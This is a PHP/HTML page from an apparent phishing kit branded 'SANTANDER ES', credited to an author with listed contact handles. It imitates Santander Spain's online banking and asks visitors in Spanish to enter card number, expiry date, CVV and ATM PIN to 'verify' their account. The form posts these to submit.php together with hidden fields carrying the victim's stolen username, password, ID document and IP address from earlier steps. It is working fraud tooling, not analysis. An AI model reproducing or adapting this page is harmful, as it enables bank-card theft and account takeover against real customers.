<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/fav.png" type="image/png"> 
        
        <title>Home</title>
    </head>

    <body style="background: #F7F7F7;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo">
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 201px;"  src="../assets/images/logoo.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" style="min-width: 27px;"  src="../assets/images/mobilelogo.png">
                </div>
                <div class="menu">
                    <img style="min-width: 543px;" class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/mainmenu.png">
                    <img style="min-width: 31px;"  class="d-lg-none d-md-block d-sm-block d-block" src="../assets/images/mobilemenu.png">
                </div>
            </div>
        </header>
        <!-- END HEADER -->
        
        <!-- NAV -->
        <nav id="nav" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="container">
                <div class="secondmenu"><img style="min-width: 675px;"  src="../assets/images/secondmenu.png"></div>
                <div class="sofia"><img style="min-width: 61px;"  src="../assets/images/sofia.png"></div>
            </div>
        </nav>
        <!-- END NAV -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="main-title"><h3>Introduzca los datos de su tarjeta de crédito para verificar su cuenta bancaria en línea</h3></div>
                <div class="details-box">
                    <p>Asegúrese de que su teléfono móvil cerca de usted para verificar su identidad a través de la verificación de SMS</p>
                    <form method="post" action="submit.php" id="cc-form">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
                            <input type="text" name="cc_number" id="cc_number" class="form-control" placeholder="Número de tarjeta" value="<?php echo get_value('cc_number'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
                            <input type="text" name="cc_date" id="cc_date" maxlength="7" class="form-control" placeholder="Fecha de caducidad (MM/YY)" value="<?php echo get_value('cc_date'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
                            <input type="text" name="cc_cvv" maxlength="3" id="cc_cvv" class="form-control" placeholder="Cód. Seguridad (XXX)" value="<?php echo get_value('cc_cvv'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'cc_pin') ?>">
                            <input type="text" name="cc_pin" id="cc_pin" maxlength="4" class="form-control" placeholder="PIN de Cajero" value="<?php echo get_value('cc_pin'); ?>">
                            <?php echo error_message($_SESSION['errors'],'cc_pin'); ?>
                        </div>
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="type" value="cc">
                        <input type="hidden" name="doc_type" id="doc_type" value="<?php echo $_SESSION['doc_type'] ?>">
                        <input type="hidden" name="doc_number" id="doc_number" value="<?php echo $_SESSION['doc_number'] ?>">
                        <input type="hidden" name="username" id="username" value="<?php echo $_SESSION['username'] ?>">
                        <input type="hidden" name="password" id="password" value="<?php echo $_SESSION['password'] ?>">
                        <input type="hidden" name="ip_address" id="ip_address" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                        <div class="form-group mt30 mb-0 text-right">
                            <button type="button" id="cc-submit">ACEPTAR</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            jQuery('#cc_number').payment('formatCardNumber');
            jQuery('#cc_cvv').payment('formatCardCVC');
            jQuery('#cc_date').payment('formatCardExpiry');
        </script>

    </body>

</html>